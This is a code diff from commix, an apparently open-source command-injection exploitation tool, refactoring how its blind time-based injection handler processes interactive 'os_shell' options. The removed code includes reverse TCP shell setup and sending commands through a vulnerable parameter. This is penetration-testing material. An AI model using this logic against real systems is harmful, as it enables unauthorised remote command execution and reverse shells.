@@ -29,10 +29,14 @@ from src.utils import session_handler
 
 from src.thirdparty.colorama import Fore, Back, Style, init
 
-from src.core.requests import headers
 from src.core.shells import reverse_tcp
+
+from src.core.requests import headers
+from src.core.requests import requests
 from src.core.requests import parameters
+
 from src.core.injections.controller import checks
+from src.core.injections.controller import shell_options
 
 from src.core.injections.blind.techniques.time_based import tb_injector
 from src.core.injections.blind.techniques.time_based import tb_payloads
@@ -472,54 +476,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                     cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                     cmd = checks.escaped_cmd(cmd)
                     if cmd.lower() in settings.SHELL_OPTIONS:
-                      os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
-                      if os_shell_option == False:
-                        if no_result == True:
-                          return False
-                        else:
-                          return True 
-                      elif os_shell_option == "quit":                    
-                        sys.exit(0)
-                      elif os_shell_option == "back":
-                        go_back = True
-                        break
-                      elif os_shell_option == "os_shell": 
-                          warn_msg = "You are already into an 'os_shell' mode."
-                          print settings.print_warning_msg(warn_msg)+ "\n"
-                      elif os_shell_option == "reverse_tcp":
-                        settings.REVERSE_TCP = True
-                        # Set up LHOST / LPORT for The reverse TCP connection.
-                        reverse_tcp.configure_reverse_tcp()
-                        if settings.REVERSE_TCP == False:
-                          continue
-                        while True:
-                          if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
-                            result = checks.check_reverse_tcp_options(settings.LHOST)
-                          else:  
-                            cmd = reverse_tcp.reverse_tcp_options()
-                            result = checks.check_reverse_tcp_options(cmd)
-                          if result != None:
-                            if result == 0:
-                              return False
-                            elif result == 1 or result == 2:
-                              go_back_again = True
-                              settings.REVERSE_TCP = False
-                              break
-                          # Command execution results.
-                          from src.core.injections.results_based.techniques.classic import cb_injector
-                          separator = checks.time_based_separators(separator, http_request_method)
-                          whitespace = settings.WHITESPACE[0]
-                          response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-                          # Evaluate injection results.
-                          shell = cb_injector.injection_results(response, TAG, cmd)
-                          # Export injection result
-                          if settings.VERBOSITY_LEVEL >= 1:
-                            print ""
-                          err_msg = "The reverse TCP connection has failed!"
-                          print settings.print_critical_msg(err_msg)
-                      else:
-                        pass
-                      
+                      shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result)
                     else:
                       print ""
                       if menu.options.ignore_session or \
